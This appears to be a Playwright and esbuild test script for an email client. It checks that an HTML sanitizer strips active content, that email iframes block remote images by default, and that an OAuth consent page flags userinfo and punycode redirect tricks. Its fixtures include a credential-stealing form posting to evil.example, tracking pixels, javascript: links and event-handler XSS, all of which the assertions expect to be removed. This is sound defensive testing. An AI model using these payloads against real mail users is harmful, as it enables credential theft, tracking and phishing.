import assert from "node:assert/strict";
import { build } from "esbuild";
import { chromium } from "@playwright/test";

const bundle = await build({
  entryPoints: ["src/lib/sanitize-html.ts"],
  bundle: true,
  write: false,
  format: "iife",
  globalName: "EmailSanitizer",
});
const browser = await chromium.launch({ headless: true });
try {
  const page = await browser.newPage();
  const attempted = [];
  await page.route("**/*", (route) => {
    attempted.push(route.request().url());
    return route.abort();
  });
  const requests = [];
  page.on("request", (request) => requests.push(request.url()));
  await page.setContent(
    '<main id="app">Trusted application</main><section id="mail"></section>',
  );
  await page.addScriptTag({ content: bundle.outputFiles[0].text });
  const result = await page.evaluate(() => {
    const dirty =
      '<style>body{display:none}#app{position:fixed}</style><form action="https://evil.example/steal"><input name="password"></form><img src="https://evil.example/pixel"><p style="background:url(https://evil.example/css)">Hello <strong>world</strong></p><a href="https://example.com/read">Read</a><svg><image href="https://evil.example/svg"></image></svg>';
    const alternate =
      '<a href="javascript:alert(1)">bad</a><iframe srcdoc="<style>*{display:none}</style>"></iframe><div id="app" class="fixed inset-0" onmouseover="alert(1)">text</div>';
    const html = EmailSanitizer.sanitizeEmailHtml(dirty + alternate);
    document.querySelector("#mail").innerHTML = html;
    return {
      html,
      appVisible:
        getComputedStyle(document.querySelector("#app")).display !== "none",
      forms: document
        .querySelector("#mail")
        .querySelectorAll("form,input,style,img,svg,iframe").length,
    };
  });
  assert.equal(result.forms, 0);
  assert.equal(result.appVisible, true);
  assert.match(result.html, /<strong>world<\/strong>/);
  assert.match(result.html, /href="https:\/\/example.com\/read"/);
  assert.doesNotMatch(
    result.html,
    /javascript:|style=|class=|id=|onmouseover|evil\.example/,
  );
  assert.equal(requests.length, 0);
  console.log(
    "PASS: active/alternate HTML stripped, trusted UI visible, ordinary formatting/link preserved, zero remote loads.",
  );

  const frameBundle = await build({
    entryPoints: ["src/lib/email-frame.ts"],
    bundle: true,
    write: false,
    format: "iife",
    globalName: "EmailFrame",
  });
  await page.addScriptTag({ content: frameBundle.outputFiles[0].text });
  await page.evaluate(async () => {
    const frame = document.createElement("iframe");
    frame.sandbox = "allow-same-origin";
    frame.srcdoc = EmailFrame.buildEmailFrameDoc(
      '<img src="https://evil.example/pixel"><style>p{background:url(https://evil.example/bg)}</style><p>Mensagem original</p>',
    );
    const loaded = new Promise((resolve) => (frame.onload = resolve));
    document.body.append(frame);
    await loaded;
    if (!frame.contentDocument.body.textContent.includes("Mensagem original"))
      throw Error("conteudo perdido");
  });
  assert.equal(
    attempted.filter((url) => url.includes("evil.example")).length,
    0,
    "iframe não pode carregar pixel remoto",
  );
  await page.evaluate(async () => {
    const frame = document.querySelector("iframe");
    const loaded = new Promise((resolve) => (frame.onload = resolve));
    frame.srcdoc = EmailFrame.buildEmailFrameDoc(
      '<img src="https://evil.example/pixel"><style>p{background:url(https://evil.example/bg)}</style><p>Mensagem original</p>',
      [],
      true,
    );
    await loaded;
  });
  assert.equal(
    attempted.filter((url) => url.includes("evil.example")).length,
    2,
    "opt-in explícito libera somente imagens HTTPS",
  );
  console.log(
    "PASS: CSP blocks remote email images by default; explicit opt-in permits HTTPS images; all browser network intercepted.",
  );

  const consent = await build({
    stdin: {
      contents:
        'import React from "react"; import {createRoot} from "react-dom/client"; import ConsentPage from "./src/pages/ConsentPage"; createRoot(document.getElementById("root")).render(React.createElement(ConsentPage));',
      resolveDir: process.cwd(),
      loader: "tsx",
    },
    bundle: true,
    write: false,
    format: "iife",
    jsx: "automatic",
    plugins: [
      {
        name: "consent-boundaries",
        setup(builder) {
          builder.onResolve(
            { filter: /^(react-router-dom|@\/lib\/(auth-client|branding))$/ },
            (args) => ({ path: args.path, namespace: "fixture" }),
          );
          builder.onLoad({ filter: /.*/, namespace: "fixture" }, (args) => ({
            contents:
              args.path === "react-router-dom"
                ? "export const useSearchParams=()=>[new URLSearchParams(window.location.search)];"
                : args.path.endsWith("branding")
                  ? 'export const useBranding=()=>({brandName:"Mail"});'
                  : 'export const authClient={$fetch:async()=>({data:{client_name:"Trusted Vendor",client_uri:"https://trusted.example"}})};',
          }));
        },
      },
    ],
  });
  await page.route("https://mail.example/**", (route) =>
    route.fulfill({
      status: 200,
      contentType: "text/html",
      body: '<div id="root"></div>',
    }),
  );
  for (const destination of [
    "https://trusted.example@evil.example/callback",
    "https://xn--pple-43d.example/callback",
    "https://trusted.example/callback",
  ]) {
    await page.goto(
      `https://mail.example/consent?${new URLSearchParams({ client_id: "untrusted", scope: "email:read email:send", redirect_uri: destination })}`,
    );
    await page.addScriptTag({ content: consent.outputFiles[0].text });
    await page.getByText("Unverified application", { exact: true }).waitFor();
    await page.getByText("Trusted Vendor", { exact: true }).waitFor();
    const content = await page.locator("body").innerText();
    assert.ok(
      content.includes(
        `Authorization destination: ${new URL(destination).origin}`,
      ),
    );
    assert.ok(content.includes("They do not verify its publisher"));
    assert.equal(
      content.includes("website and authorization destination differ"),
      new URL(destination).origin !== "https://trusted.example",
    );
    assert.ok(
      await page
        .getByRole("button", { name: "Authorize", exact: true })
        .isEnabled(),
    );
  }
  console.log(
    "PASS: real consent UI labels self-asserted identity and actual normalized destination; userinfo/punycode attacks and matching-origin control covered.",
  );
} finally {
  await browser.close();
}
